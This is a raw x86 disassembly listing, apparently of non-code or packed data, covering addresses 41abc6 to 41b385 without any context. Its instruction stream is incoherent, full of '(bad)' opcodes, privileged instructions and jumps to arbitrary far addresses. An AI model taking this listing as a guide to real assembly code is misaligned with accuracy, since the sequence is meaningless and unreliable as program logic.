  41abc6:	mov    dh,0xc1
  41abc8:	retf   0x7ff9
  41abcb:	test   DWORD PTR [eax+0xc9db68f],edx
  41abd1:	xor    edx,ecx
  41abd3:	pop    ds
  41abd4:	int    0xe5
  41abd6:	adc    al,0xe5
  41abd8:	sbb    DWORD PTR [edx-0x607eee02],edi
  41abde:	icebp  
  41abdf:	(bad)  
  41abe0:	adc    al,0xc5
  41abe2:	cmp    eax,0x794c9830
  41abe7:	inc    eax
  41abe8:	fisubr DWORD PTR ds:0xdcbc3f2f
  41abee:	and    dl,BYTE PTR [eax]
  41abf0:	xor    BYTE PTR [ecx-0x49f202e],ah
  41abf6:	(bad)  
  41abf8:	mov    al,ds:0x76452eb
  41abfd:	call   0xddd82daa
  41ac02:	mov    eax,0x638fd29
  41ac07:	fisubr DWORD PTR [edi+0x6d]
  41ac0a:	dec    ecx
  41ac0b:	or     eax,0x5118521b
  41ac10:	sbb    ebp,esi
  41ac12:	jle    0x41ac46
  41ac14:	(bad)  
  41ac16:	stc    
  41ac17:	lods   al,BYTE PTR ds:[esi]
  41ac18:	mov    DWORD PTR [esi+0x14],edx
  41ac1b:	inc    esp
  41ac1c:	mov    edx,0xd441afb8
  41ac21:	xor    BYTE PTR [ebp+eiz*8-0x28],0x31
  41ac26:	loope  0x41ac28
  41ac28:	sub    al,0x65
  41ac2a:	call   0x33f6:0x53bc7e84
  41ac31:	inc    ecx
  41ac32:	push   esi
  41ac33:	inc    esp
  41ac34:	mov    esi,0xcf7e619d
  41ac39:	fisubr DWORD PTR [ebp-0x32a73f9e]
  41ac3f:	adc    ecx,DWORD PTR [ecx]
  41ac41:	loopne 0x41aca6
  41ac43:	mov    ch,0x9a
  41ac45:	rcr    cl,1
  41ac47:	(bad)  [edx+ebx*4+0x4d62c350]
  41ac4e:	mov    esi,0x780f9bb
  41ac53:	das    
  41ac54:	jmp    0x4633:0xabd9e55f
  41ac5b:	lds    edi,FWORD PTR [ecx]
  41ac5d:	ret    0x8246
  41ac60:	jecxz  0x41acbf
  41ac62:	lods   eax,DWORD PTR ds:[esi]
  41ac63:	fist   DWORD PTR [edx]
  41ac65:	dec    edi
  41ac66:	mov    edi,esp
  41ac68:	jle    0x41ace3
  41ac6a:	jmp    0x5600a757
  41ac6f:	adc    bl,dl
  41ac71:	jmp    0x4037e6e8
  41ac76:	xchg   DWORD PTR [edi+0x616572a],eax
  41ac7c:	fbstp  TBYTE PTR [esi]
  41ac7e:	retf   
  41ac7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac80:	data16 int3 
  41ac82:	xchg   esp,eax
  41ac83:	mov    eax,ds:0x159f5eba
  41ac88:	(bad)  
  41ac89:	adc    DWORD PTR [edx-0x3fd34e9c],ebx
  41ac8f:	retf   0x9355
  41ac92:	mov    edi,cs
  41ac94:	xchg   esi,eax
  41ac95:	outs   dx,BYTE PTR ds:[esi]
  41ac96:	adc    ebp,esi
  41ac98:	pushw  0x8b2b
  41ac9c:	hlt    
  41ac9d:	xchg   esi,eax
  41ac9e:	xchg   esi,eax
  41ac9f:	dec    ebp
  41aca0:	add    DWORD PTR [eax+0x4],ebp
  41aca3:	and    al,0x86
  41aca5:	and    edi,DWORD PTR [edi]
  41aca7:	ret    0x8470
  41acaa:	xlat   BYTE PTR ds:[ebx]
  41acab:	sub    eax,0x6cb4fc49
  41acb0:	jo     0x41aca1
  41acb2:	mov    ebp,0x7234ff07
  41acb7:	mov    esp,0xe72e4ee
  41acbc:	sub    eax,0x22b2fd6b
  41acc1:	ror    bh,0xa3
  41acc4:	call   0x8809766f
  41acc9:	inc    ebx
  41acca:	ret    0xd1bf
  41accd:	jle    0x41ad13
  41accf:	(bad)  
  41acd0:	stos   BYTE PTR es:[edi],al
  41acd1:	test   DWORD PTR [edx-0x35],esp
  41acd4:	and    eax,0x639fe1ab
  41acd9:	lahf   
  41acda:	imul   eax,DWORD PTR [eax],0xffffffd6
  41acdd:	(bad)  
  41acdf:	test   al,0x6c
  41ace1:	shr    BYTE PTR [eax+0x64152711],1
  41ace7:	enter  0xfaaa,0xfe
  41aceb:	pusha  
  41acec:	call   0xd4e6:0x912742e1
  41acf3:	jmp    0xac51:0xedce4290
  41acfa:	add    DWORD PTR [ebp+eiz*8+0x5960fb2d],esi
  41ad01:	dec    BYTE PTR [edx+0x522d1bb4]
  41ad07:	and    al,0x4a
  41ad09:	ds pop ds
  41ad0b:	jecxz  0x41acd7
  41ad0d:	sbb    edx,DWORD PTR [edx+0x43]
  41ad10:	sti    
  41ad11:	mov    edx,0x4da025eb
  41ad16:	jl     0x41ad14
  41ad18:	mov    ch,0x17
  41ad1a:	lahf   
  41ad1b:	out    0x4a,eax
  41ad1d:	add    DWORD PTR [edi+0x7c],ebx
  41ad20:	mov    ecx,0x57a7c4aa
  41ad25:	mov    eax,0x9a5a36ab
  41ad2a:	(bad)  
  41ad2b:	adc    al,BYTE PTR [ebx+ebp*2-0x1d]
  41ad2f:	sub    al,0x3e
  41ad32:	jg     0x41ad7c
  41ad34:	cld    
  41ad35:	addr16 int3 
  41ad37:	fdivr  QWORD PTR [edx-0x611d3fea]
  41ad3d:	ret    0x612c
  41ad40:	repnz icebp 
  41ad42:	rcr    BYTE PTR [edx+esi*1],1
  41ad45:	push   ecx
  41ad46:	jnp    0x41ad25
  41ad48:	daa    
  41ad49:	xchg   esp,eax
  41ad4a:	inc    edx
  41ad4b:	inc    ebx
  41ad4c:	mov    ch,bl
  41ad4e:	mov    dl,0xd9
  41ad50:	fwait
  41ad51:	mov    ch,0x6a
  41ad53:	jo     0x41ad51
  41ad55:	jmp    0x41ad4a
  41ad57:	call   0x62de:0xa5ae533
  41ad5e:	jle    0x41acf1
  41ad60:	fmul   QWORD PTR [edx]
  41ad62:	mov    esp,eax
  41ad64:	lea    edi,[eax]
  41ad66:	ror    BYTE PTR [esi+0x18],1
  41ad69:	mov    ds:0xbf43f757,al
  41ad6e:	pop    esp
  41ad6f:	cmp    DWORD PTR [eax-0x5f],esi
  41ad72:	sbb    BYTE PTR [eax-0x13],dh
  41ad75:	push   ebx
  41ad76:	in     al,dx
  41ad77:	add    eax,0x23a14fa1
  41ad7c:	inc    BYTE PTR [edi+0x53ec08e2]
  41ad82:	(bad)  [ebx]
  41ad84:	xor    ch,BYTE PTR [eax+ebp*8-0x407499c1]
  41ad8b:	xchg   ecx,eax
  41ad8c:	push   esi
  41ad8d:	ins    DWORD PTR es:[edi],dx
  41ad8e:	adc    DWORD PTR [edx-0x76],ecx
  41ad91:	xchg   ecx,eax
  41ad92:	and    BYTE PTR [edi-0x4f279bde],ah
  41ad98:	pop    ss
  41ad99:	jne    0x41ad39
  41ad9b:	jge    0x41ad20
  41ad9d:	nop
  41ad9e:	adc    DWORD PTR [edx-0x6d],edx
  41ada1:	push   eax
  41ada2:	cmp    BYTE PTR [ecx],dl
  41ada4:	or     BYTE PTR [edx+0x73],dh
  41ada7:	sub    DWORD PTR [esp+esi*2+0xa8d5a9a],ecx
  41adae:	sbb    DWORD PTR [edx+edx*4+0x69],0x236726de
  41adb6:	mov    WORD PTR [edx],?
  41adb8:	push   ebp
  41adb9:	dec    ebx
  41adba:	mov    ebp,0xe68c1d11
  41adbf:	push   edx
  41adc0:	pop    ebx
  41adc1:	sub    eax,0x17e90b4
  41adc6:	xor    eax,0x3c30f45b
  41adcb:	mov    cl,0xa1
  41adcd:	in     eax,dx
  41adce:	adc    ebx,DWORD PTR [ebp-0x185ac402]
  41add4:	xor    BYTE PTR [edi+0x67],0x4
  41add8:	cmp    DWORD PTR [ecx+0x3a],0x98d47f5c
  41addf:	into   
  41ade0:	fwait
  41ade1:	jno    0x41adf5
  41ade3:	push   edx
  41ade4:	call   0xb61d8202
  41ade9:	dec    esi
  41adea:	xor    BYTE PTR [bp+di],0xe5
  41adee:	ss inc ecx
  41adf0:	cmc    
  41adf1:	shl    ebx,1
  41adf3:	push   edi
  41adf4:	dec    ecx
  41adf5:	mov    ebp,0x4b69723e
  41adfa:	je     0x41ada0
  41adfc:	push   cs
  41adfd:	jns    0x41ae0d
  41adff:	mov    edx,0xc81eebc3
  41ae04:	inc    esp
  41ae05:	mov    dh,0x3f
  41ae07:	push   cs
  41ae08:	add    BYTE PTR [edi],al
  41ae0a:	popf   
  41ae0b:	jp     0x41adf0
  41ae0d:	shl    DWORD PTR [ebx+ecx*8+0x67b39cc],cl
  41ae14:	hlt    
  41ae15:	adc    eax,0x8e8ada86
  41ae1a:	xchg   edi,eax
  41ae1b:	mov    ch,0xf6
  41ae1d:	dec    edx
  41ae1e:	dec    edx
  41ae1f:	mov    eax,0xf54434aa
  41ae24:	and    DWORD PTR [esi-0x3bfe30e1],ebx
  41ae2a:	sub    dh,dh
  41ae2c:	(bad)  
  41ae2e:	jbe    0x41aea3
  41ae30:	and    edx,DWORD PTR [ebx-0x6f]
  41ae33:	mov    ah,0x1d
  41ae35:	fst    DWORD PTR [ecx+0x1e9ca476]
  41ae3b:	les    ebx,FWORD PTR [ecx+0x43]
  41ae3e:	sub    bl,bh
  41ae40:	sub    DWORD PTR [ebx-0xf],0x6f240a5d
  41ae47:	jb     0x41ae94
  41ae49:	push   0xe0578002
  41ae4e:	outs   dx,BYTE PTR ds:[esi]
  41ae4f:	or     eax,0x3b71c682
  41ae54:	cs dec edx
  41ae56:	sahf   
  41ae57:	ja     0x41ae82
  41ae59:	push   0x18
  41ae5b:	mov    BYTE PTR [edx-0x7940d00e],dl
  41ae61:	dec    ebx
  41ae62:	out    dx,eax
  41ae63:	es sbb eax,0x13f14490
  41ae69:	cmp    edi,esi
  41ae6b:	xchg   edi,eax
  41ae6c:	xchg   ecx,eax
  41ae6d:	push   0x4aa9357e
  41ae72:	push   eax
  41ae73:	xchg   esi,edi
  41ae75:	xchg   ecx,eax
  41ae76:	les    esi,FWORD PTR [ecx]
  41ae78:	les    ebp,FWORD PTR [edx]
  41ae7a:	loope  0x41ae28
  41ae7c:	call   0x42a0:0x418587c3
  41ae83:	and    al,0x8f
  41ae85:	xor    al,0x3c
  41ae87:	jae    0x41ae4b
  41ae89:	in     al,0x83
  41ae8b:	cmp    ecx,DWORD PTR [eax+0x58]
  41ae8e:	out    0x1b,al
  41ae90:	adc    BYTE PTR [esi-0x57f6b62b],dh
  41ae96:	test   eax,0x174c41a0
  41ae9b:	aaa    
  41ae9c:	ror    BYTE PTR [esi+0x5],1
  41ae9f:	lods   eax,DWORD PTR ss:[esi]
  41aea1:	add    ecx,eax
  41aea3:	imul   esp,DWORD PTR [ebx],0x43
  41aea6:	mov    ebx,0x40af9ccf
  41aeab:	hlt    
  41aeac:	mov    al,0xac
  41aeae:	dec    ebp
  41aeaf:	clc    
  41aeb0:	(bad)  
  41aeb1:	sub    bh,BYTE PTR ss:[ecx+0x7717e1cd]
  41aeb8:	fadd   DWORD PTR [edx]
  41aeba:	fst    QWORD PTR [edi-0x24e92d2e]
  41aec0:	mov    al,0x77
  41aec2:	dec    edx
  41aec3:	push   0x50e6305a
  41aec8:	push   es
  41aec9:	hlt    
  41aeca:	sets   BYTE PTR [ebp+0x754c4348]
  41aed1:	cdq    
  41aed2:	fistp  WORD PTR [edx]
  41aed4:	outs   dx,BYTE PTR ds:[esi]
  41aed5:	in     al,0x7
  41aed7:	xor    BYTE PTR [ecx+0x406b2002],dh
  41aedd:	jnp    0x41ae8c
  41aedf:	jo     0x41af51
  41aee1:	cs loopne 0x41aee5
  41aee4:	fisttp QWORD PTR [ebx+0x16c59d7b]
  41aeea:	mov    al,ds:0xcbae5f20
  41aeef:	add    BYTE PTR [ecx-0x405bdf99],bh
  41aef5:	pop    ebx
  41aef6:	sub    eax,0x8b93b0eb
  41aefb:	mov    esp,0xe05e3801
  41af00:	xor    eax,0x6c5f2fe7
  41af05:	repz enter 0x91ff,0x2f
  41af0a:	or     eax,0x4ff783bd
  41af0f:	loopne 0x41af1b
  41af11:	test   DWORD PTR ds:0x91db648,edi
  41af17:	dec    ecx
  41af18:	sbb    BYTE PTR [edi+ebp*1-0x731a28be],bh
  41af1f:	push   ss
  41af20:	pop    ebp
  41af21:	jecxz  0x41aece
  41af23:	imul   ebp,DWORD PTR [edx+ecx*4-0x2],0xffffff80
  41af28:	lea    edx,[edx-0x22]
  41af2b:	jg     0x41af84
  41af2d:	push   ds
  41af2e:	dec    edi
  41af2f:	into   
  41af30:	add    al,0x5f
  41af32:	mov    ch,0xdc
  41af34:	push   esp
  41af35:	data16 dec BYTE PTR [edi]
  41af38:	aam    0xb
  41af3a:	xor    esi,esp
  41af3c:	imul   BYTE PTR [edi-0x6b4a07ba]
  41af42:	lea    eax,[eax-0x55d4ba04]
  41af48:	push   ss
  41af49:	or     esp,eax
  41af4b:	jne    0x41af3f
  41af4d:	inc    esp
  41af4e:	scas   al,BYTE PTR es:[edi]
  41af4f:	sub    DWORD PTR [ebp-0x1e],0xffffffb1
  41af53:	ins    DWORD PTR es:[edi],dx
  41af54:	sbb    eax,0x3da0c67b
  41af59:	fucomi st,st(3)
  41af5b:	imul   edx,DWORD PTR [esi],0x7f5e5202
  41af61:	es and al,0x25
  41af64:	inc    esp
  41af65:	add    DWORD PTR [edi+0x1a6bd727],ebp
  41af6b:	mov    edi,0x94f00f5b
  41af70:	adc    eax,0xd0e35131
  41af75:	xchg   esp,eax
  41af76:	sub    eax,0x183054d6
  41af7b:	jl     0x41af3a
  41af7d:	or     esi,DWORD PTR [ebx-0x55]
  41af80:	or     DWORD PTR [ecx-0x6f],ebp
  41af83:	ins    BYTE PTR es:[edi],dx
  41af84:	mov    al,0x84
  41af86:	je     0x41b004
  41af88:	sbb    BYTE PTR [eax-0x40],dh
  41af8b:	mov    BYTE PTR [ebx+0x2ac2ee8],dl
  41af91:	jge    0x41af3e
  41af93:	jmp    0x294c:0x2375ff96
  41af9a:	arpl   WORD PTR [bx],dx
  41af9d:	pop    ecx
  41af9e:	je     0x41af5d
  41afa0:	ja     0x41afc4
  41afa2:	mov    al,ds:0xea164caa
  41afa7:	mov    al,0xc1
  41afa9:	scas   eax,DWORD PTR es:[edi]
  41afaa:	dec    esp
  41afab:	int3   
  41afac:	fsubr  DWORD PTR [ecx]
  41afae:	mov    DWORD PTR [eax+0x73],esi
  41afb1:	pop    esi
  41afb2:	mov    bl,0x15
  41afb4:	adc    eax,0xe0669027
  41afb9:	and    esi,ecx
  41afbb:	in     eax,0x1b
  41afbd:	jecxz  0x41afe5
  41afbf:	test   edx,eax
  41afc1:	jns    0x41b02d
  41afc3:	and    esi,DWORD PTR [edx-0x20]
  41afc6:	enter  0x9bc4,0x6d
  41afca:	push   0x20f381e5
  41afcf:	es adc dl,ah
  41afd2:	aad    0xd1
  41afd4:	jg     0x41aff1
  41afd6:	test   cl,bl
  41afd8:	scas   eax,DWORD PTR es:[edi]
  41afd9:	in     al,dx
  41afda:	pop    edx
  41afdb:	loopne 0x41b024
  41afdd:	mov    edx,0xfecab2e4
  41afe2:	fidiv  WORD PTR [esi+0x69]
  41afe5:	imul   edx,DWORD PTR [eax],0x14
  41afe8:	pop    ecx
  41afe9:	mov    DWORD PTR [edi-0x6eddd9bb],esp
  41afef:	xlat   BYTE PTR ds:[ebx]
  41aff0:	jns    0x41b06f
  41aff2:	mov    bh,0xa5
  41aff4:	js     0x41b00a
  41aff6:	mov    edi,esi
  41aff8:	and    edx,ebp
  41affa:	xlat   BYTE PTR ds:[ebx]
  41affb:	sbb    bh,bl
  41affd:	sub    DWORD PTR [eax],edi
  41afff:	nop
  41b000:	inc    ebx
  41b001:	xor    BYTE PTR [eax+ebp*8-0x6c],ah
  41b005:	push   ebp
  41b006:	jmp    0x41b01f
  41b008:	jne    0x41b005
  41b00a:	mov    ah,0x23
  41b00c:	arpl   WORD PTR [ebx],bx
  41b00e:	icebp  
  41b00f:	mov    ecx,0xc8951db3
  41b014:	sbb    DWORD PTR [ebx],edi
  41b016:	pop    ss
  41b017:	cmp    WORD PTR [ecx+0x78],bx
  41b01b:	push   esi
  41b01c:	les    esi,FWORD PTR [ebx]
  41b01e:	xchg   edx,eax
  41b01f:	push   eax
  41b020:	push   ebp
  41b021:	stos   DWORD PTR es:[edi],eax
  41b022:	test   al,0x5c
  41b024:	cli    
  41b025:	add    eax,0xb757d844
  41b02a:	or     al,0x9b
  41b02c:	loope  0x41b04b
  41b02e:	pop    ebp
  41b02f:	inc    edi
  41b030:	mov    ds:0x15f1d9c8,al
  41b035:	push   edx
  41b036:	in     eax,dx
  41b037:	jle    0x41b0a0
  41b039:	call   0x50be:0xd7828c8b
  41b040:	mov    eax,0x768ed20b
  41b045:	xlat   BYTE PTR ds:[ebx]
  41b046:	or     dh,BYTE PTR [ebx-0x6eecad92]
  41b04c:	fs das 
  41b04e:	(bad)  
  41b04f:	cli    
  41b050:	adc    dh,dh
  41b052:	lods   al,BYTE PTR ds:[esi]
  41b053:	lods   eax,DWORD PTR ds:[esi]
  41b054:	cdq    
  41b055:	popf   
  41b056:	sbb    al,0xfe
  41b058:	pusha  
  41b059:	inc    ecx
  41b05a:	pop    edi
  41b05b:	jno    0x41b068
  41b05d:	ja     0x41b039
  41b05f:	push   ds
  41b060:	push   ebx
  41b061:	mov    ebp,0x33c30b50
  41b066:	xchg   edi,eax
  41b067:	or     eax,0x175af390
  41b06c:	loop   0x41b08f
  41b06e:	or     DWORD PTR [edx+0x77143387],ebx
  41b074:	or     eax,ebp
  41b076:	inc    edx
  41b077:	pusha  
  41b078:	mov    WORD PTR [edx+esi*1+0x73],ss
  41b07c:	and    DWORD PTR [eax-0x58],esi
  41b07f:	jecxz  0x41b0be
  41b081:	ss sub eax,0x60bb1526
  41b087:	aad    0xd0
  41b089:	rol    dl,cl
  41b08b:	gs sbb ch,bl
  41b08e:	adc    DWORD PTR [ebx-0x7d],eax
  41b091:	shr    DWORD PTR [ebx+0x3b],1
  41b094:	jg     0x41b049
  41b096:	retf   0x3722
  41b099:	sahf   
  41b09a:	dec    edx
  41b09b:	repz jb 0x41b09c
  41b09e:	pop    edi
  41b09f:	or     al,0xb3
  41b0a1:	fiadd  WORD PTR [ebx]
  41b0a3:	in     al,dx
  41b0a4:	add    bl,BYTE PTR [eax+eiz*2+0x5e0e3f22]
  41b0ab:	je     0x41b0a5
  41b0ad:	data16 loop 0x41b07c
  41b0b0:	ja     0x41b129
  41b0b2:	xor    ah,BYTE PTR cs:[edx+0x30fa0909]
  41b0b9:	sbb    eax,ebp
  41b0bb:	fidivr DWORD PTR [esi]
  41b0bd:	xchg   esi,eax
  41b0be:	mov    eax,0x4b70869
  41b0c3:	jnp    0x41b13a
  41b0c5:	pop    ss
  41b0c6:	mov    cl,0x46
  41b0c8:	mov    ah,0x8f
  41b0ca:	div    DWORD PTR [edx]
  41b0cc:	fdiv   DWORD PTR [eax+0x3b]
  41b0cf:	hlt    
  41b0d0:	dec    ecx
  41b0d1:	dec    ecx
  41b0d2:	xchg   ebx,eax
  41b0d3:	jmp    0x41b141
  41b0d5:	push   ds
  41b0d6:	loop   0x41b11b
  41b0d8:	mov    ecx,0x638561b2
  41b0dd:	cmp    dh,BYTE PTR [ecx+0x3277a562]
  41b0e3:	and    BYTE PTR [ecx-0x75],cl
  41b0e6:	out    dx,al
  41b0e7:	in     eax,dx
  41b0e8:	call   0xd156:0x4203211c
  41b0ef:	outs   dx,BYTE PTR ds:[esi]
  41b0f0:	xor    al,0x7d
  41b0f2:	das    
  41b0f3:	inc    edx
  41b0f4:	adc    BYTE PTR [ebx+0xb50b03f],dh
  41b0fa:	and    edx,DWORD PTR [ecx-0x43]
  41b0fd:	je     0x41b0df
  41b0ff:	(bad)  
  41b100:	out    0x5f,al
  41b102:	outs   dx,BYTE PTR ds:[esi]
  41b103:	mov    eax,ds:0x7ebc8b2e
  41b108:	xchg   ebx,ecx
  41b10a:	int3   
  41b10b:	xchg   edx,eax
  41b10c:	fucomi st,st(7)
  41b10e:	dec    edx
  41b10f:	int    0xd6
  41b111:	push   eax
  41b112:	pop    esi
  41b113:	xchg   ebp,eax
  41b114:	xchg   BYTE PTR [eax-0x41],bl
  41b117:	clc    
  41b118:	dec    edx
  41b119:	xchg   edx,eax
  41b11a:	pop    es
  41b11b:	or     al,0x1e
  41b11d:	mov    cl,dl
  41b11f:	cmp    ah,BYTE PTR [eax]
  41b121:	nop
  41b122:	shl    BYTE PTR [edi+ebp*8+0x71],0x66
  41b127:	adc    cl,al
  41b129:	test   BYTE PTR [ecx-0x6],dl
  41b12c:	xchg   ecx,eax
  41b12d:	pop    es
  41b12e:	ss dec ecx
  41b130:	mov    al,0xc7
  41b132:	dec    edi
  41b133:	popf   
  41b134:	lods   al,BYTE PTR ds:[esi]
  41b135:	nop
  41b136:	push   ss
  41b137:	adc    eax,0x63c456f2
  41b13c:	push   ecx
  41b13d:	push   edx
  41b13e:	inc    esp
  41b13f:	in     al,0xcf
  41b141:	lahf   
  41b142:	push   esi
  41b143:	arpl   WORD PTR [ebx],sp
  41b145:	cmp    dh,dl
  41b147:	or     DWORD PTR [edi+0x450b18ef],0xf7c43deb
  41b151:	adc    al,0x65
  41b153:	jno    0x41b160
  41b155:	push   ebx
  41b156:	scas   eax,DWORD PTR es:[edi]
  41b157:	fisttp DWORD PTR cs:[esi+0x76061d73]
  41b15e:	inc    ebx
  41b15f:	xor    bl,ch
  41b161:	loop   0x41b0e9
  41b163:	adc    BYTE PTR [eax+ebx*2],al
  41b166:	ins    DWORD PTR es:[edi],dx
  41b167:	xlat   BYTE PTR ds:[ebx]
  41b168:	mov    WORD PTR [edi-0x1b286f],gs
  41b16e:	shr    ecx,1
  41b170:	sub    DWORD PTR [ebx-0x43aa3f48],edi
  41b176:	jecxz  0x41b1a2
  41b178:	cvttps2pi mm5,QWORD PTR [ecx-0x66fa8a39]
  41b17f:	add    ebx,DWORD PTR [edi+edx*2+0x48647039]
  41b186:	fs outs dx,DWORD PTR es:[esi]
  41b189:	pop    esp
  41b18a:	clc    
  41b18b:	loopne 0x41b131
  41b18d:	add    eax,0x66cf0f9b
  41b192:	ret    0x6942
  41b195:	(bad)  
  41b196:	mov    dl,0x6
  41b198:	pop    es
  41b199:	mov    eax,ds:0xf225dd39
  41b19e:	or     ah,BYTE PTR [edi]
  41b1a0:	shl    BYTE PTR [esi],cl
  41b1a2:	int3   
  41b1a3:	ins    BYTE PTR es:[edi],dx
  41b1a4:	fld    TBYTE PTR [esi+0x6d]
  41b1a7:	sbb    edi,ebp
  41b1a9:	mov    eax,0xb02227bf
  41b1ae:	std    
  41b1af:	arpl   WORD PTR [eax+0x5f],di
  41b1b2:	retf   
  41b1b3:	xor    ah,al
  41b1b5:	ins    DWORD PTR es:[edi],dx
  41b1b6:	ins    BYTE PTR es:[edi],dx
  41b1b7:	ss call 0x325ffd4e
  41b1bd:	add    eax,0xbee65905
  41b1c2:	aam    0xf1
  41b1c4:	adc    BYTE PTR [edi+edi*1-0x587e1b2f],dh
  41b1cb:	push   edx
  41b1cc:	pop    esi
  41b1cd:	ins    BYTE PTR es:[edi],dx
  41b1ce:	dec    ebx
  41b1cf:	ds xchg ebp,eax
  41b1d1:	outs   dx,BYTE PTR ds:[esi]
  41b1d2:	imul   ecx,DWORD PTR [ecx+0x55],0xffffffb8
  41b1d6:	scas   al,BYTE PTR es:[edi]
  41b1d7:	cmp    al,BYTE PTR ss:[edx]
  41b1da:	sahf   
  41b1db:	jl     0x41b204
  41b1dd:	jmp    0x41b197
  41b1df:	jb     0x41b19f
  41b1e1:	inc    esp
  41b1e2:	cld    
  41b1e3:	cwde   
  41b1e4:	jmp    0xc18cb98a
  41b1e9:	pop    es
  41b1ea:	enter  0xe5ba,0x2c
  41b1ee:	or     ch,al
  41b1f0:	hlt    
  41b1f1:	bound  ebp,QWORD PTR [eax-0x178a618f]
  41b1f7:	pop    edi
  41b1f8:	mov    ebx,0xadfa28bc
  41b1fd:	arpl   WORD PTR [edi+0x70],bp
  41b200:	fidivr DWORD PTR [ebx]
  41b202:	xchg   esp,eax
  41b203:	stos   BYTE PTR es:[edi],al
  41b204:	and    bl,BYTE PTR [ecx+ecx*2+0x76c17e80]
  41b20b:	mov    ecx,0x52017872
  41b210:	pushf  
  41b211:	int    0xd5
  41b213:	or     ebx,esi
  41b215:	sub    DWORD PTR [ebp+0x4e0c5c81],esp
  41b21b:	pop    esi
  41b21c:	jmp    0xbe1f:0xea93a1ed
  41b223:	enter  0x422f,0x5d
  41b227:	jge    0x41b1b7
  41b229:	jge    0x41b1ad
  41b22b:	sbb    bl,BYTE PTR [ecx-0x2f195b8b]
  41b231:	clc    
  41b232:	cmp    al,BYTE PTR [edx+0x54]
  41b235:	jge    0x41b208
  41b237:	add    dh,dl
  41b239:	push   ebx
  41b23a:	sbb    DWORD PTR [esi-0x46b52dad],edx
  41b240:	ror    BYTE PTR [ebx-0x4f50eeaa],1
  41b246:	bound  esi,QWORD PTR [ebx+ebp*1-0x75]
  41b24a:	scas   al,BYTE PTR es:[edi]
  41b24b:	jp     0x41b1ef
  41b24d:	cs in  al,dx
  41b24f:	sub    al,0xf5
  41b251:	push   ecx
  41b252:	pop    esp
  41b253:	call   0x609b22f5
  41b258:	push   ss
  41b259:	daa    
  41b25a:	pop    ecx
  41b25b:	cmp    cl,BYTE PTR [eax-0x4f84b01]
  41b261:	mov    eax,0xd136534c
  41b266:	ja     0x41b20a
  41b268:	test   eax,0xab6f9699
  41b26d:	xor    BYTE PTR [esi+0x8],al
  41b270:	out    dx,eax
  41b271:	mov    dh,0x44
  41b273:	inc    eax
  41b274:	dec    edx
  41b275:	(bad)  
  41b276:	push   esi
  41b277:	sbb    ah,BYTE PTR [eax+ebx*8]
  41b27a:	cld    
  41b27b:	xchg   ecx,eax
  41b27c:	pop    ds
  41b27d:	push   ebx
  41b27e:	stc    
  41b27f:	shl    DWORD PTR [ecx+0x71e71ff4],cl
  41b285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b286:	pop    ebp
  41b287:	xchg   DWORD PTR [ecx+0x21de32b2],esi
  41b28d:	inc    eax
  41b28e:	add    al,0x9
  41b290:	pushf  
  41b291:	outs   dx,DWORD PTR ds:[esi]
  41b292:	mov    edx,0x389079c9
  41b297:	inc    ebp
  41b298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b299:	lods   eax,DWORD PTR ds:[esi]
  41b29a:	(bad)  
  41b29b:	int    0x20
  41b29d:	bound  esi,QWORD PTR [edx]
  41b29f:	push   ecx
  41b2a0:	(bad)  
  41b2a1:	push   0x22
  41b2a3:	fidiv  WORD PTR [ebp-0x4d969954]
  41b2a9:	add    BYTE PTR [ebx-0x7bd98ef7],bl
  41b2af:	das    
  41b2b0:	imul   edx,DWORD PTR [esi+ebp*2+0x1f8e2c87],0x4e593e00
  41b2bb:	dec    esi
  41b2bc:	inc    ebp
  41b2bd:	adc    dh,BYTE PTR [edx+0x6f]
  41b2c0:	pop    edi
  41b2c1:	and    cl,BYTE PTR [edx+0x51]
  41b2c4:	mov    edi,0x17edc7af
  41b2c9:	or     bl,BYTE PTR [ebp+0x6b]
  41b2cc:	neg    DWORD PTR [edx+0x1d87a7d2]
  41b2d2:	loope  0x41b2d1
  41b2d4:	pusha  
  41b2d5:	or     BYTE PTR [eax+0x4f],dh
  41b2d8:	mov    ecx,0xcd985651
  41b2dd:	mov    ch,0x1c
  41b2df:	mov    esi,0xa5ff191
  41b2e4:	ret    
  41b2e5:	pop    ecx
  41b2e6:	fcomp  st(2)
  41b2e8:	mov    edx,0x4fd27685
  41b2ed:	mov    al,ds:0xa1ac78a
  41b2f2:	xor    al,0x6c
  41b2f4:	jnp    0x41b308
  41b2f6:	jmp    0x41b2fd
  41b2f8:	mov    ebp,0xd691c8a4
  41b2fd:	dec    edi
  41b2fe:	test   eax,0x7a63438c
  41b303:	push   esp
  41b304:	xlat   BYTE PTR ds:[ebx]
  41b305:	mov    BYTE PTR [edx-0x55],bh
  41b308:	pinsrw mm4,ebx,0x54
  41b30c:	in     al,dx
  41b30d:	mov    eax,0x471295c8
  41b312:	inc    esi
  41b313:	arpl   WORD PTR [eax+esi*1],cx
  41b316:	dec    edx
  41b317:	in     al,dx
  41b318:	lock std 
  41b31a:	loopne 0x41b2c8
  41b31c:	je     0x41b37a
  41b31e:	pushf  
  41b31f:	inc    ebx
  41b320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b321:	sti    
  41b322:	arpl   WORD PTR [ebp-0x68],cx
  41b325:	or     BYTE PTR [edx],dl
  41b327:	xor    ebx,DWORD PTR ds:0x13e3
  41b32c:	add    eax,0x3c74d53f
  41b331:	ins    DWORD PTR es:[edi],dx
  41b332:	arpl   WORD PTR [ecx+ecx*8+0x68383603],di
  41b339:	sub    ch,BYTE PTR [edi]
  41b33b:	enter  0xee64,0xe6
  41b33f:	mov    ebp,0xca74fd37
  41b344:	and    BYTE PTR [eax+0x182d9403],ah
  41b34a:	sbb    DWORD PTR [ebx+0x79ec6653],ebp
  41b350:	mov    ds:0x797c767d,eax
  41b355:	mov    edx,esp
  41b357:	push   0x3
  41b359:	mov    eax,ds:0xc32fb9e3
  41b35e:	popf   
  41b35f:	pop    edx
  41b360:	and    eax,edi
  41b362:	cmp    eax,0xa75fe07b
  41b367:	jnp    0x41b385
  41b369:	xlat   BYTE PTR ds:[ebx]
  41b36a:	add    eax,0x43773983
  41b36f:	mov    ebx,0xdac9bb1a
  41b374:	add    DWORD PTR [edx+0x1c6ca19d],esp
  41b37a:	pop    ecx
  41b37b:	xor    esp,DWORD PTR [esi]
  41b37d:	cs xchg edx,eax
  41b37f:	aaa    
  41b380:	fnsave [esi-0x4d]
  41b383:	add    esp,edi
  41b385:	imul   eax,DWORD PTR [esi+0x61a3418d],0x6aa274c4
